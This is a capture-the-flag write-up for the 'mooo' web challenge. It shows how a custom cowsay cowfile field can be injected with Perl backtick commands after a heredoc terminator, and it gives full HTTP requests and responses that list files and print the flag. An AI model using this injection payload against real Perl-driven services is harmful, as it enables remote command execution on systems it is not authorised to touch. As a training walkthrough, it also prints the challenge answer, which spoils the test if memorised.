# OverTheWire Advent Bonanza – mooo

* **Category:** web
* **Points:** 98

## Challenge

> 'Moo may represent an idea, but only the cow knows.' - Mason Cooley
settings
> 
> Service: http://3.93.128.89:1204
> 
> Author: semchapeu

## Solution

The website allows to use [cowsay 3.03+dfsg2-4](https://launchpad.net/ubuntu/bionic/amd64/cowsay/3.03+dfsg2-4) command to print messages.

There is a functionality to create your own cowfile: `http://3.93.128.89:1204/cow_designer`.

Cowfiles are like [the following](https://github.com/bkendzior/cowfiles/blob/master/bearface.cow).

```perl
##
## acsii picture from http://www.ascii-art.de/ascii/ab/bear.txt
##
$eye = chop($eyes);
$the_cow = <<EOC;
 $thoughts
  $thoughts
     .--.              .--.
    : (\\ ". _......_ ." /) :
     '.    `        `    .'
      /'   _        _   `\\
     /     $eye}      {$eye     \\
    |       /      \\       |
    |     /'        `\\     |
     \\   | .  .==.  . |   /
      '._ \\.' \\__/ './ _.'
      /  ``'._-''-_.'``  \\
EOC
```

Considering that you can write your own, probably that one is represented following this format and the string you pass to the cow designer functionality is appended after `$the_cow` variable.

You can try to modify the content of that file with a code like the following.

```perl
EOCA$eyes=`ls`;print "$eyes";
```

The `A` letter is a placeholder that with a proxy must be changed to ``\n (`0x0a`). Furthermore, due to a restriction in the functionality, you can only use variables already defined into the Perl script, like `$eyes`.

You can use the following HTTP request to enumerate the directory content.

```
POST /cow_designer HTTP/1.1
Host: 3.93.128.89:1204
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 74
Origin: http://3.93.128.89:1204
Connection: close
Referer: http://3.93.128.89:1204/cow_designer
Cookie: session=.eJyrVkouLS7Jz41Pzi9XslJKyClOUNJRSq1MLUbwSvLz0ktTYfxaAMTyEP8.Xeeu7A.HifJJrvsmNcHgfIYXZNFlPfocqs
Upgrade-Insecure-Requests: 1

message=message&custom_cow=EOC
$eyes=`ls`;print "$eyes";&eyes=ee&tongue=tt

HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Wed, 04 Dec 2019 18:52:30 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Vary: Cookie
Set-Cookie: session=eyJjdXN0b21fY293IjoiRU9DXG4kZXllcz1gbHNgO3ByaW50IFwiJGV5ZXNcIjsiLCJleWVzIjoiZWUiLCJ0b25ndWUiOiJ0dCJ9.XegAbg.EMqHGbwtgY3BiQ9ulqMh74tdZ-Y; HttpOnly; Path=/
Content-Length: 720

<!DOCTYPE html>
<html>
<head>
    <link href="/static/style.css" rel="stylesheet" type="text/css" />
</head>

<body>
    <h1>Mooo!</h1>
    <form action="/cow_designer" method="POST">
        Message:
        <input type="text" name="message" value="message"><br> 
        Cow:<br>
        <textarea rows="8" cols="40" name="custom_cow">
EOC
$eyes=`ls`;print &#34;$eyes&#34;;
        </textarea><br>
        Eyes:
        <input type="text" name="eyes" value="ee"><br>
        Tongue:
        <input type="text" name="tongue" value="tt"><br> 
        <input type="submit" value="say">
    </form>
    
    
    <div><pre>flag
server.py
templates
 _________
&lt; message &gt;
 ---------
</pre></div>
    
</body>

</html>
```

And you can use the following request HTTP to print the flag file.

```
POST /cow_designer HTTP/1.1
Host: 3.93.128.89:1204
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 80
Origin: http://3.93.128.89:1204
Connection: close
Referer: http://3.93.128.89:1204/cow_designer
Cookie: session=.eJyrVkouLS7Jz41Pzi9XslJKyClOUNJRSq1MLUbwSvLz0ktTYfxaAMTyEP8.Xeeu7A.HifJJrvsmNcHgfIYXZNFlPfocqs
Upgrade-Insecure-Requests: 1

message=message&custom_cow=EOC
$eyes=`cat flag`;print "$eyes";&eyes=ee&tongue=tt

HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Wed, 04 Dec 2019 18:53:16 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Vary: Cookie
Set-Cookie: session=eyJjdXN0b21fY293IjoiRU9DXG4kZXllcz1gY2F0IGZsYWdgO3ByaW50IFwiJGV5ZXNcIjsiLCJleWVzIjoiZWUiLCJ0b25ndWUiOiJ0dCJ9.XegAnA.U8mwtSnPeAaqSKFzmuJqy-962Xo; HttpOnly; Path=/
Content-Length: 733

<!DOCTYPE html>
<html>
<head>
    <link href="/static/style.css" rel="stylesheet" type="text/css" />
</head>

<body>
    <h1>Mooo!</h1>
    <form action="/cow_designer" method="POST">
        Message:
        <input type="text" name="message" value="message"><br> 
        Cow:<br>
        <textarea rows="8" cols="40" name="custom_cow">
EOC
$eyes=`cat flag`;print &#34;$eyes&#34;;
        </textarea><br>
        Eyes:
        <input type="text" name="eyes" value="ee"><br>
        Tongue:
        <input type="text" name="tongue" value="tt"><br> 
        <input type="submit" value="say">
    </form>
    
    
    <div><pre>AOTW{th3_p3rl_c0w_s4ys_M0oO0o0O} _________
&lt; message &gt;
 ---------
</pre></div>
    
</body>

</html>
```

The flag is the following.

```
AOTW{th3_p3rl_c0w_s4ys_M0oO0o0O}
```